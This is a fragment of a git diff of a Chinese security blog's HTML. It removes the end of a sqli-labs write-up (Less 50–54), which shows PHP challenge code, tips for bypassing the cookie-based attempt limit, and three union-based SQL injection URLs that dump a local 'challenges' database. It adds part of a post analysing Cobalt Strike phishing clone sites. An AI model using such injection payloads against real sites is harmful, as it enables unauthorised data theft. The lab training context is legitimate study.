-Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;
-&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;
-&lt;/form&gt; 
-&lt;/div&gt;
-
-
-&lt;?php
-
-}
-
-else
-{
-    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;
-    $key = addslashes($_POST[&#39;key&#39;]); /*处理特殊字符*/
-    $key = mysql_real_escape_string($key);
-    //echo $key;
-    //Query table to verify your result
-    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;
-    //echo &quot;$sql&quot;;
-    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());
-
-    $row = mysql_fetch_array($result);
-
-    if($row)
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;
-        echo &quot;&lt;/font&gt;&quot;; 
-        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );    
-    }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;
-        header( &quot;refresh:3;url=index.php&quot; );
-        //print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
-            }    
-
-
-}
-
-?&gt;
-
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>要求你注入获取到key，数据库不在是security,限制注入次数为10次，如果超过此次数，重定向到主页，并且每次的密码都是随机的。虽然如此，但是这是通过cookie来判断你的次数，你可以修改你cookie或者更换IP和浏览器来进行多次试验<br>PS:给出数据库名：challenges<br><img src="https://s2.ax1x.com/2019/02/14/kDP6ij.png" alt="kDP6ij.png"></p>
-<pre><code>payload:
-http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+
-http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%22v1icuozblo%22%20--+
-http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(secret_J0N4,tryy),3%20from%20v1icuozblo%20--+
-</code></pre><p>最终得到随机密码是：J7oVFGp7S8WSd5Nb1xLBK7uF11</p>
-<p>转载请声明：转自422926799.github.io</p>
+response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;WIDTH=\&quot;0\&quot; HEIGHT=\&quot;0\&quot;&gt;&lt;/IFRAME&gt;&quot;
+</code></pre><p><img src="https://z3.ax1x.com/2021/06/10/2RF9pj.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2381,12 +1919,12 @@ http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_co
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>sqli labs Less 50 -&gt; Less 54</p>
+    <p><span class="copy-title">文章标题:</span>cs钓鱼克隆网站分析</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-02-14, 18:37:41</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b0e668d5.html" title="sqli labs Less 50 -&gt; Less 54">http://422926799.github.io/posts/b0e668d5.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-06-10, 17:49:12</p>
+    <p><span class="copy-title">最后更新:</span>2021-06-10, 17:54:43</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9efc32ef.html" title="cs钓鱼克隆网站分析">http://422926799.github.io/posts/9efc32ef.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
